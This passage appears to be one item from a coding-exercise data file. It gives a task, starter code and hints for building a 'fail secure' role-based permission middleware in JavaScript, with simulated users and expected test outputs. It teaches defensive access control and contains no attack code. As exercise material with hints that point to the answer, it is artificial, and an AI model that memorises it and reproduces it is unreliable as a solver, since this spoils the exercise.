      task: 'Implement a secure permission check middleware that enforces access control. It must fail secure — any error should deny access, not grant it.',
      starterCode: `// Permission definitions
const PERMISSIONS = {
  'read:posts':     ['viewer', 'member', 'admin'],
  'write:posts':    ['member', 'admin'],
  'delete:posts':   ['admin'],
  'manage:users':   ['admin'],
  'read:analytics': ['analyst', 'admin'],
}

// Simulated user store
const users = {
  'u1': { id: 'u1', role: 'member' },
  'u2': { id: 'u2', role: 'viewer' },
  'u3': { id: 'u3', role: 'admin' },
  'u4': { id: 'u4', role: 'analyst' },
}

// TODO: requirePermission(permission) — returns a middleware function
// The middleware:
// 1. Gets user from req.user (set by auth middleware)
// 2. If no user: deny (fail secure)
// 3. Looks up user's role
// 4. Checks if role is in PERMISSIONS[permission]
// 5. If any error occurs: DENY (fail secure) — never accidentally allow
// 6. Calls next() if allowed, returns 403 if denied
function requirePermission(permission) {
  return (req, res, next) => {
    try {
      // implement here — fail secure!
    } catch (err) {
      // ANY error = deny (fail secure)
      return res.status(403).json({ error: 'Access denied' })
    }
  }
}

// Simulate middleware pipeline for testing
function simulateRequest(userId, permission) {
  const req = { user: userId ? users[userId] : null }
  const res = {
    status: (code) => ({
      json: (data) => console.log(\`[\${code}] \${permission} for \${userId || 'anon'}: \${data.error || 'DENIED'}\`)
    })
  }
  const next = () => console.log(\`[200] \${permission} for \${userId}: ALLOWED\`)

  requirePermission(permission)(req, res, next)
}

simulateRequest('u3', 'manage:users')   // admin → ALLOWED
simulateRequest('u1', 'write:posts')    // member → ALLOWED
simulateRequest('u2', 'write:posts')    // viewer → DENIED
simulateRequest(null, 'read:posts')     // no user → DENIED
simulateRequest('u1', 'manage:users')  // member → DENIED`,
      hints: [
        'If !req.user, return 403 immediately (fail secure)',
        'Get allowed roles: PERMISSIONS[permission] — if permission doesn\'t exist, deny',
        'Check if req.user.role is in the allowed roles array: allowedRoles.includes(req.user.role)',
        'Wrap everything in try/catch — any exception returns 403, not 500 or 200',
      ],
    },
  },
]
